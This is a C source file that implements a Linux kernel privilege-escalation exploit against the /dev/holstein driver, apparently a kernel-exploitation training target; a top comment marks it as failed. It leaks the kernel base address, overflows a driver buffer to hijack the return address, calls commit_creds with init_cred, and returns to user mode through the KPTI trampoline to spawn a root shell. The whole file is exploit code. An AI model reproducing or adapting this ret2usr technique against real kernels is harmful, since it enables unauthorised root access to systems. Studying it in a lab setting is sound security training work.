// failed

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stdout, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

// for saved states
uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
uint64_t vmlinux;
int fd;

#define COMMIT_CREDS (vmlinux + 0x06e390)
#define INIT_CRED (vmlinux + 0xE33500)
#define KPTI_TRAMPOLINE (vmlinux + 0x800e26)

void leak_vmlinux_base()
{
    char out_buf[0x410] = {};
    read(fd, out_buf, 0x410);

    vmlinux = *(uint64_t*)&out_buf[0x408] - 0x13d33c;
    SUCCESS("vmlinux 0x%lx", vmlinux);
    return;
}

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        ".att_syntax prefix;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags));

    INFO("Saved state");
}

static void restore_state()
{
    asm volatile("movq %0, 0x30(%%rsp);"
                 "movq %1, 0x28(%%rsp);"
                 "movq %2, 0x20(%%rsp);"
                 "movq %3, 0x18(%%rsp);"
                 "movq %4, 0x10(%%rsp);"
                 "jmp *%5;"
                 :
                 : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs),
                 "r"(win),
                 "r"(KPTI_TRAMPOLINE));
}

static void escalate_privilege()
{
    char *ic= (char *)INIT_CRED;
    void (*cc)(char*) = (void*)(COMMIT_CREDS);

    (*cc)(ic);
    restore_state();
}

int main()
{
    save_state();
    fd = open("/dev/holstein", O_RDWR);
    if (fd == -1) {
        ERROR("open(\"/dev/holstein\")");
        exit(1);
    }

    leak_vmlinux_base();

    const int BUF_SIZE = 0x510;

    char buf[BUF_SIZE] = {};
    memset(buf, 'a', 0x408);
    *(unsigned long*)&buf[0x408] = (unsigned long)&escalate_privilege;
    write(fd, buf, BUF_SIZE);

    close(fd);
    return 0;
}
